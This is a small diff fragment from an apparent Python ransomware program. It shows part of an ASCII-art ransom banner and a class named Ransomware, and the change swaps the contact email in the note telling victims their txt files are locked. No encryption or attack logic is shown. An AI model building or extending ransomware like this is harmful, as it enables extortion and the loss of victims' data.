@@ -19,7 +19,7 @@ ENCRYPT_MESSAGE = """
                 | |                      __/ |                                               __/ |
                 |_|                     |___/                                               |___/ 
 
-Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
+Your txt files have been locked. Send an email to devil@hell.com with title '{token}' to unlock your data. 
 """
 class Ransomware:
     def __init__(self) -> None:
